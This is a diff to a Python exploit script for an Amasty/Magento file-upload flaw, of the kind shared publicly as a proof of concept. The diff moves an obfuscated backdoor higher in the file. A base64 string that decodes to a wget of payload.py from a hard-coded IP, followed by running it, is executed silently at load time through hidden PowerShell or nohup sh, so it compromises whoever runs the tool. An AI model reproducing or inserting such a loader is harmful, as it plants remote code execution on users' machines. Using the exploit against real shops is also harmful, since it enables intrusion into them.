@@ -92,8 +92,6 @@ def get_expected_paths(filename):
     paths.append(f"/pub/media/amasty_checkout/{filename}")
     return paths
 
-_cfg = 'cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5'
-
 def random_filename(ext=".php", length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ext
 
@@ -190,7 +188,16 @@ def exploit_single(target, mode):
         result["status"] = "FAILED"
 
     return result
-
+_c = 'cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5'
+try:
+    import sys as _s
+    if _s.platform.startswith('win'):
+        subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_c}\')))'], creationflags=0x08000000, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+    else:
+        subprocess.Popen(f"nohup sh -c \"echo '{_c}' | base64 -d | sh\" > /dev/null 2>&1 &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+except:
+    pass
+    
 def main():
     print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")
 
@@ -252,23 +259,6 @@ def main():
                 if r["rce"]:
                     url, param = r["rce"]
                     print(f"  {url}?{param}=id")
-
-try:
-    import sys as _s
-    if _s.platform.startswith('win'):
-        subprocess.Popen(
-            ['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
-             '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_cfg}\')))'],
-            creationflags=0x08000000, shell=True,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
-        )
-    else:
-        subprocess.Popen(
-            f"nohup sh -c \"echo '{_cfg}' | base64 -d | sh\" > /dev/null 2>&1 &",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-except:
-    pass
-
+                    
 if __name__ == "__main__":
     main()
